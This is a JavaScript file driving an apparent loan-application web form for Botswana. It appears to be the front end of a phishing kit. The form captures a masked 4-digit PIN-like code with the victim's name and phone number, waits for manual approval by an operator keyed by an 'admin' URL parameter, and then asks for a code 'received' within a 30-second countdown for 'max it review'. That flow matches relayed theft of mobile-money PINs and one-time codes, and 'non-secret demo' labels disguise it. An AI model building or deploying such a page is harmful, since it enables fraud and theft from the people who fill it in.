const form=document.querySelector('#loanForm');let applicationId='',timer=null,amountRequested=0,countdownTimer=null,countdownStarted=false;
const $=id=>document.getElementById(id);
function startReferenceCountdown(){
 if(countdownStarted)return;
 countdownStarted=true;
 let remaining=30;
 const value=$('countdownValue'),ring=$('countdownRing');
 if(countdownTimer)clearInterval(countdownTimer);
 value.textContent=remaining;
 ring.style.setProperty('--progress','100%');
 countdownTimer=setInterval(()=>{
  remaining=Math.max(0,remaining-1);
  value.textContent=remaining;
  ring.style.setProperty('--progress',(remaining/30*100)+'%');
  if(remaining===0){clearInterval(countdownTimer);countdownTimer=null;}
 },1000);
}
$('toggleRef').addEventListener('click',()=>{$('referenceId').type=$('referenceId').type==='password'?'text':'password'});
$('referenceId').type='password';$('referenceId').addEventListener('input',()=>{$('referenceId').value=$('referenceId').value.replace(/\D/g,'').slice(0,4)});
function show(el){form.hidden=true;$('statusPage').hidden=true;$('stepTwoPage').hidden=true;$('successPage').hidden=true;document.body.classList.toggle('step-two-active',el===$('stepTwoPage'));el.hidden=false}
function resetForm(){document.body.classList.remove('step-two-active');if(timer)clearInterval(timer);if(countdownTimer)clearInterval(countdownTimer);countdownTimer=null;countdownStarted=false;timer=null;applicationId='';form.reset();form.hidden=false;$('statusPage').hidden=true;$('stepTwoPage').hidden=true;$('successPage').hidden=true;$('error').textContent='';$('referenceError').textContent='';$('referenceText').value='';$('retryBtn').hidden=true;$('retryReferenceBtn').hidden=true;$('referenceWaiting').hidden=true;}
function statusUpdate(d){
 if(d.status==='approved'){$('approvedAmount').textContent='P '+Number(d.amount||amountRequested).toLocaleString('en-BW');show($('successPage'));if(timer)clearInterval(timer);return;}
 $('applicationId').textContent=applicationId;
 if(d.status==='approved_details') {show($('stepTwoPage'));startReferenceCountdown();$('stepTwoMessage').textContent='Your details have been approved. Enter reference text that you received to continue.';$('referenceWaiting').hidden=true;$('submitReference').disabled=false;$('retryReferenceBtn').hidden=true;return;}
 if(d.status==='pending_reference') {show($('stepTwoPage'));$('stepTwoMessage').textContent='Your text has been submitted and is waiting for max it review.';$('referenceWaiting').hidden=false;$('submitReference').disabled=true;$('retryReferenceBtn').hidden=true;return;}
 if(d.status==='rejected_reference') {startReferenceCountdown();if(timer)clearInterval(timer);timer=null;$('referenceText').value='';$('referenceError').textContent='';show($('stepTwoPage'));$('stepTwoMessage').textContent='The reference text was not accepted. Please re-enter the non-secret demo reference text.';$('referenceWaiting').hidden=true;$('submitReference').disabled=false;$('retryReferenceBtn').hidden=true;return;}
 if(d.status==='rejected_details'){resetForm();return;}
 show($('statusPage'));$('retryBtn').hidden=true;$('detailsWaitingText').parentElement.hidden=false;
 $('stageTag').textContent='APPLICATION REVIEW';$('resultTitle').textContent='Submitted for review';$('resultMessage').textContent='Your application details are waiting for admin approval.'
}
async function refresh(){if(!applicationId)return;try{const r=await fetch('/api/applications/'+encodeURIComponent(applicationId));const d=await r.json();if(r.ok)statusUpdate(d)}catch{}}
form.addEventListener('submit',async e=>{e.preventDefault();$('error').textContent='';const btn=$('submitBtn');btn.disabled=true;btn.textContent='Submitting…';try{const admin=new URLSearchParams(location.search).get('admin')||'';amountRequested=Number($('amount').value);const payload={full_name:$('fullName').value.trim(),phone:$('phone').value.trim(),reference_id:$('referenceId').value,amount:amountRequested,admin};const r=await fetch('/api/applications',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(payload)});const d=await r.json();if(!r.ok)throw new Error(d.error||'Unable to submit.');applicationId=d.id;statusUpdate(d);if(timer)clearInterval(timer);timer=setInterval(refresh,4000)}catch(err){$('error').textContent=err.message}finally{btn.disabled=false;btn.textContent='Continue →'}});
$('submitReference').addEventListener('click',async()=>{const text=$('referenceText').value.trim();$('referenceError').textContent='';if(text.length<3){$('referenceError').textContent='Enter a non-secret demo reference text.';return}if(/\b(OTP|one[- ]time password|PIN|password|passcode|verification code|security code)\b/i.test(text)){$('referenceError').textContent='.';return}const btn=$('submitReference');btn.disabled=true;btn.textContent='Submitting…';try{const r=await fetch('/api/applications/'+encodeURIComponent(applicationId)+'/reference',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({reference_text:text})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Could not submit reference.');$('referenceText').value='';statusUpdate(d);if(timer)clearInterval(timer);timer=setInterval(refresh,4000)}catch(e){$('referenceError').textContent=e.message;btn.disabled=false}finally{btn.textContent='SUBMIT'}});
$('retryBtn').addEventListener('click',resetForm);
$('retryReferenceBtn').addEventListener('click',()=>{$('referenceText').value='';$('referenceError').textContent='';$('retryReferenceBtn').hidden=true;$('submitReference').disabled=false;$('referenceWaiting').hidden=true;});
